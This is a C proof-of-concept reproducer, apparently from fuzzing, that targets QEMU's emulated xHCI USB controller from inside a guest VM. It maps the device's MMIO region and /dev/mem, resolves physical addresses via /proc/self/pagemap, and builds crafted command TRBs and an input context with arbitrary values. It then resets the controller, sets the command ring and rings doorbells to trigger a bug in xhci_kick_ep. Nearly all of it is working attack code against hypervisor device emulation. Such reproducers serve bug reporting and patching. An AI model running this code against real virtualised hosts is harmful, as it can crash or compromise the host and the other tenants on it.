#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

//
// XHCI specific structs
//
#define XHCI_MAXPORTS_2 15
#define XHCI_MAXPORTS_3 15

#define XHCI_MAXPORTS (XHCI_MAXPORTS_2 + XHCI_MAXPORTS_3)
#define XHCI_MAXSLOTS 64
#define XHCI_MAXINTRS 16

/* must be power of 2 */
#define XHCI_LEN_REGS 0x4000

typedef struct XHCIStreamContext XHCIStreamContext;
typedef struct XHCIEPContext XHCIEPContext;

enum xhci_flags {
    XHCI_FLAG_SS_FIRST = 1,
    XHCI_FLAG_FORCE_PCIE_ENDCAP,
    XHCI_FLAG_ENABLE_STREAMS,
};

typedef enum TRBType {
    TRB_RESERVED = 0,
    TR_NORMAL,
    TR_SETUP,
    TR_DATA,
    TR_STATUS,
    TR_ISOCH,
    TR_LINK,
    TR_EVDATA,
    TR_NOOP,
    CR_ENABLE_SLOT,
    CR_DISABLE_SLOT,
    CR_ADDRESS_DEVICE,
    CR_CONFIGURE_ENDPOINT,
    CR_EVALUATE_CONTEXT,
    CR_RESET_ENDPOINT,
    CR_STOP_ENDPOINT,
    CR_SET_TR_DEQUEUE,
    CR_RESET_DEVICE,
    CR_FORCE_EVENT,
    CR_NEGOTIATE_BW,
    CR_SET_LATENCY_TOLERANCE,
    CR_GET_PORT_BANDWIDTH,
    CR_FORCE_HEADER,
    CR_NOOP,
    ER_TRANSFER = 32,
    ER_COMMAND_COMPLETE,
    ER_PORT_STATUS_CHANGE,
    ER_BANDWIDTH_REQUEST,
    ER_DOORBELL,
    ER_HOST_CONTROLLER,
    ER_DEVICE_NOTIFICATION,
    ER_MFINDEX_WRAP,
    /* vendor specific bits */
    CR_VENDOR_NEC_FIRMWARE_REVISION  = 49,
    CR_VENDOR_NEC_CHALLENGE_RESPONSE = 50,
} TRBType;

typedef enum TRBCCode {
    CC_INVALID = 0,
    CC_SUCCESS,
    CC_DATA_BUFFER_ERROR,
    CC_BABBLE_DETECTED,
    CC_USB_TRANSACTION_ERROR,
    CC_TRB_ERROR,
    CC_STALL_ERROR,
    CC_RESOURCE_ERROR,
    CC_BANDWIDTH_ERROR,
    CC_NO_SLOTS_ERROR,
    CC_INVALID_STREAM_TYPE_ERROR,
    CC_SLOT_NOT_ENABLED_ERROR,
    CC_EP_NOT_ENABLED_ERROR,
    CC_SHORT_PACKET,
    CC_RING_UNDERRUN,
    CC_RING_OVERRUN,
    CC_VF_ER_FULL,
    CC_PARAMETER_ERROR,
    CC_BANDWIDTH_OVERRUN,
    CC_CONTEXT_STATE_ERROR,
    CC_NO_PING_RESPONSE_ERROR,
    CC_EVENT_RING_FULL_ERROR,
    CC_INCOMPATIBLE_DEVICE_ERROR,
    CC_MISSED_SERVICE_ERROR,
    CC_COMMAND_RING_STOPPED,
    CC_COMMAND_ABORTED,
    CC_STOPPED,
    CC_STOPPED_LENGTH_INVALID,
    CC_MAX_EXIT_LATENCY_TOO_LARGE_ERROR = 29,
    CC_ISOCH_BUFFER_OVERRUN = 31,
    CC_EVENT_LOST_ERROR,
    CC_UNDEFINED_ERROR,
    CC_INVALID_STREAM_ID_ERROR,
    CC_SECONDARY_BANDWIDTH_ERROR,
    CC_SPLIT_TRANSACTION_ERROR
} TRBCCode;

typedef uint64_t dma_addr_t;

#define USBCMD_RS       (1<<0)
#define USBCMD_HCRST    (1<<1)
#define USBCMD_INTE     (1<<2)
#define USBCMD_HSEE     (1<<3)
#define USBCMD_LHCRST   (1<<7)
#define USBCMD_CSS      (1<<8)
#define USBCMD_CRS      (1<<9)
#define USBCMD_EWE      (1<<10)
#define USBCMD_EU3S     (1<<11)

#define TRB_SIZE 16
typedef struct XHCITRB {
    uint64_t parameter;
    uint32_t status;
    uint32_t control;
} XHCITRB;

typedef struct ictl {
    uint32_t ictl_ctx[2];
    uint32_t reserved0[6];
    uint32_t slot_ctx[4];
    uint32_t reserved1[4];
    uint32_t ep0_ctx[5];
    uint32_t reserved2[3];
} ictl;

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce xhci-00: start\n[+]\n");

    // lspci -v and we will get ohci's pci address
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // hcd-xhci has enabled the master bit

    // GDB
    // gef config context.nb_lines_backtrace 2
    // b ../hw/usb/hcd-xhci.c:2925

    // regs
    // * capabilities, EVENT_TYPE_MMIO_WRITE, 0xe0000000 +0x40, 4,4
    // * operational, EVENT_TYPE_MMIO_WRITE, 0xe0000040 +0x400, 4,8
    // * usb3 port #1, EVENT_TYPE_MMIO_WRITE, 0xe0000440 +0x10, 4,4
    // * usb3 port #2, EVENT_TYPE_MMIO_WRITE, 0xe0000450 +0x10, 4,4
    // * usb3 port #3, EVENT_TYPE_MMIO_WRITE, 0xe0000460 +0x10, 4,4
    // * usb3 port #4, EVENT_TYPE_MMIO_WRITE, 0xe0000470 +0x10, 4,4
    // * runtime, EVENT_TYPE_MMIO_WRITE, 0xe0001000 +0x220, 4,8
    // * doorbell, EVENT_TYPE_MMIO_WRITE, 0xe0002000 +0x820, 4,4
    
    // prepare dependent buffers
    XHCITRB *trb0 = (XHCITRB *)calloc_256aligned(3 * TRB_SIZE);
    uint64_t trb0_phys = gva_to_gpa(trb0);

    // a trb to enable a slot
    trb0[0].control = 0x39482531;

    // a trb to address the slot
    trb0[1].control = 0x01142e59;

    ictl *ictl0 = (ictl *)calloc_256aligned(sizeof(ictl));
    uint64_t ictl0_phys = gva_to_gpa(ictl0);
    ictl0->ictl_ctx[0] = 0;
    ictl0->ictl_ctx[1] = 3;
    ictl0->slot_ctx[1] = 0x6d08feb9;
    ictl0->ep0_ctx[0] = 0x1e9c2920;

    trb0[1].parameter = ictl0_phys;

    // a trb to terminate the operation
    // all zero is fine

    // reset
    mmio_write(0x0040, USBCMD_HCRST);

    // set USB commands
    mmio_write(0x0040, 0xc984cf1);
    // set xhci->cmd_ring
    mmio_write(0x0058, (uint32_t)(trb0_phys & 0xffffffff));
    mmio_write(0x005c, (uint32_t)(trb0_phys >> 32));
    // process commands
    mmio_write(0x2000, 0x0);
    // trigger xhci_kick_ep
    mmio_write(0x2004, 0x22cc1401);

    printf("[+]\n[+] Reproduce xhci-00: fail!\n[+]\n");

    return 0;
}
